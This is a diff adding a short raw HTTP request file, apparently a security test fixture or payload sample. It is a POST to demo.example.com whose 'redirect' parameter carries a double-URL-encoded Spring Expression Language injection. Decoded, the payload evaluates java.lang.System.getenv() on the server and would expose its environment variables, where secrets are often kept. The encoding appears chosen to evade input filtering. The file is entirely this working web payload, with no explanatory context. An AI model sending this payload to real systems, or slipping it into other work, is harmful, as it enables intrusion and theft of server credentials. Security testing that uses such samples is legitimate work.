@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Connection: close
+
+redirect=%2524%257BT%2528java.lang.System%2529.getenv%2528%2529%257D
